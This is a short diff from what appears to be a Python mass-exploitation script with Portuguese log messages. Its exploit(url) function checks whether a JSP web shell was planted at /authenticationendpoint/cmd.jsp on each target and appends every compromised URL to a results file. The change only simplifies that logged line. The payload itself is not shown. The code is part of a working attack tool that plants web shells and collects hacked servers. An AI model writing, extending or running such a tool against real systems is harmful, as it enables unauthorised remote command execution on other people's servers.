@@ -49,7 +49,7 @@ def exploit(url):
         if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
             console.log(f"[green][<>] Explorado com sucesso, shell : [bold]{url}/authenticationendpoint/cmd.jsp[/bold][/green]")
             with open('result.txt', 'a') as result:
-                result.write(f'\n[<>] Explorado com sucesso, shell : {url}/authenticationendpoint/cmd.jsp')
+                result.write(f'\n{url}/authenticationendpoint/cmd.jsp')
 
         else:
             console.log(f"\r[red][!] Falhou [/red] {url}")
